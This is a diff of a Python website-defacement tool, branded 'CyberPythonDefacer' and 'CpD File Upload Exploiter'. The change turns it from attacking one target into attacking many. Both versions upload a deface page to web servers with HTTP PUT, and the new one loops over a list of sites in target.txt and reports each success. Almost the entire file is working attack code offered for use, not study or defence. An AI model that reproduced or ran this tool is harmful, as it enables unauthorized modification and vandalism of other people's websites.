@@ -1,74 +1,76 @@
-#!/usr/bin/python
+#-*- coding: utf-8 -*-
 
-import requests
-import string
-import random
-import sys
-import os
+try:
+   import requests
+   import os.path
+   import sys
+except ImportError:
+   exit("install requests and try again ...")
 
-os.system("clear")
+banner = """
 
-print """
-▄████▄   ██▓███  ▓█████▄    
-▒██▀ ▀█  ▓██░  ██▒▒██▀ ██▌   
-▒▓█    ▄ ▓██░ ██▓▒░██   █▌   
-▒▓▓▄ ▄██▒▒██▄█▓▒ ▒░▓█▄   ▌   
-▒ ▓███▀ ░▒██▒ ░  ░░▒████▓    
-░ ░▒ ▒  ░▒▓▒░ ░  ░ ▒▒▓  ▒    
-  ░  ▒   ░▒ ░      ░ ▒  ▒    
-░        ░░        ░ ░  ░    
-░ ░                  ░       
-░                  ░         
+ █  /$$$$$$            /$$$$$$$ Author: Berat Zendeli aKa CyberPython
+ /$$__  $$          | $$__  $$ Date: 29/08/2020
+| $$  \__/  /$$$$$$ | $$  \ $$ Tools: CyberPythonDefacer
+| $$       /$$__  $$| $$  | $$ Github: /C-Python
+| $$      | $$  \ $$| $$  | $$ Facebook: /cp2k20
+| $$    $$| $$  | $$| $$  | $$ Instagram: /cyberpythonofficial
+|  $$$$$$/| $$$$$$$/| $$$$$$$/
+ \______/ | $$____/ |_______/ 
+          | $$                
+          | $$                
+          |__/                 
+"""
 
-def webdav():
-  sc = ''
-  with open(sys.argv[2], 'rb') as f:
-      depes = f.read()
-  script = depes
-  host = sys.argv[1]
-  if not host.startswith('http'):
-    host = 'http://' + host
-  nama = '/'+sys.argv[2]
+b = '\033[31m'
+h = '\033[32m'
+m = '\033[00m'
 
+def x(tetew):
+   ipt = ''
+   if sys.version_info.major > 2:
+      ipt = input(tetew)
+   else:
+      ipt = raw_input(tetew)
+   
+   return str(ipt)
 
-  print("[*] Upload File Name : %s") % (sys.argv[2])
-  print("[*] Uploading %d Bytes, Script CpD") % len(script)
+def aox(script,target_file="target.txt"):
+   op = open(script,"r").read()
+   with open(target_file, "r") as target:
+      target = target.readlines()
+      s = requests.Session()
+      print("uploading file to %d website"%(len(target)))
+      for web in target:
+         try:
+            site = web.strip()
+            if site.startswith("http://") is False:
+               site = "http://" + site
+            req = s.put(site+"/"+script,data=op)
+            if req.status_code < 200 or req.status_code >= 250:
+               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
+            else:
+               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
 
-  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})
+         except requests.exceptions.RequestException:
+            continue
+         except KeyboardInterrupt:
+            print; exit()
 
-  if r.status_code < 200 or r.status_code >= 300:
-    print("[!] Upload failed . . .")
-    sys.exit(1)
-  else:
-    print("[+] File uploaded . . .")
-    print("[+] PATH : "+host + nama)
+def main(__bn__):
+   print(__bn__)
+   while True:
+      try:
+         a = x("Enter your script deface name: ")
+         if not os.path.isfile(a):
+            print("file '%s' not found"%(a))
+            continue
+         else:
+            break
+      except KeyboardInterrupt:
+         print; exit()
 
+   aox(a)
 
-def cekfile():
- print("""
-[*] CpD File Upload Exploiter
-[*] Coded To Python By CyberPython A.s.S Team
-[*] Thx To Anonymous Team For PHP Exploit
-""")
- print("[*] Cek File 7o Target : "+sys.argv[1]+"/"+sys.argv[2])
- r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
- if r.status_code == requests.codes.ok:
-  print("[*] Di Temukan File Yg Sama Di Target . . .")
-  tanya = raw_input("[!] Replace File Target ? [Y/N] > ")
-  if tanya == "Y":
-   webdav()
-  else:
-   print("[!] Exiting Tools . . .")
-   sys.exit()
- else:
-   print("[*] File Go To Target . . .")
-   print("[*] Process Upload Script  . . .")
-   webdav()
-
-
-if __name__ == '__main__':
-  if len(sys.argv) != 3:
-    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
-    sys.exit(0)
-  else:
-    cekfile()
+if __name__ == "__main__":
+    main(banner)
